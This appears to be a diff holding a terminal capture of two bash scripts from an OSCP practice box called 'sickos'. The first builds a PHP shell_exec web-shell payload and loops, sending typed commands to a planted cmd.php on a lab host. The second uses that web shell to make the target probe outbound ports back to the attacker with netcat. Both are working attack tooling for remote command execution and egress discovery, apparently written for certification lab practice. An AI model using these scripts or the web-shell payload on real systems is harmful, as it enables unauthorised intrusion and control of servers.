@@ -1,0 +1,37 @@
+bttai@debian:~/OSCP/boxes/sickos$ cat cmd.sh 
+#!/bin/bash
+
+exec () {
+ payload="<?php echo shell_exec('$1 2>&1'); ?>";
+ #curl --silent -X PUT 192.168.2.4/test/execute.php -H 'Expect: ' -d "$payload"; 
+ result=$(curl -G --data-urlencode "c=$1" http://192.168.158.133/test/cmd.php)
+}
+
+while true; do
+ echo -n "> "
+ read cmd
+ if [[ "$cmd" == "exit" ]]; then
+	exit
+ else
+	curl -G --data-urlencode "c=$cmd" http://192.168.158.133/test/cmd.php
+ fi
+
+done
+
+
+bttai@debian:~/OSCP/boxes/sickos$ cat ping.sh 
+ports="21 22 23 25 80 110 443 8080 8443"
+for port in $(seq 0 9000); do
+	nc -lvp $port > /dev/null 2>&1 &
+	#ls -al > /dev/null 2>&1 &
+	nc_pid=$!
+	echo $port
+	cmd="nc -z -w 1 192.168.158.1 $port && echo '$port connextion successful'
+       #	|| echo '$port connexion failed'"
+	#echo $cmd
+	
+	curl -G --data-urlencode "c=$cmd" --url http://192.168.158.133/test/cmd.php
+	#nc -z -w 1 192.168.158.1 $port && echo "successful" || echo "failed"
+	
+	kill $nc_pid 2>/dev/null
+done
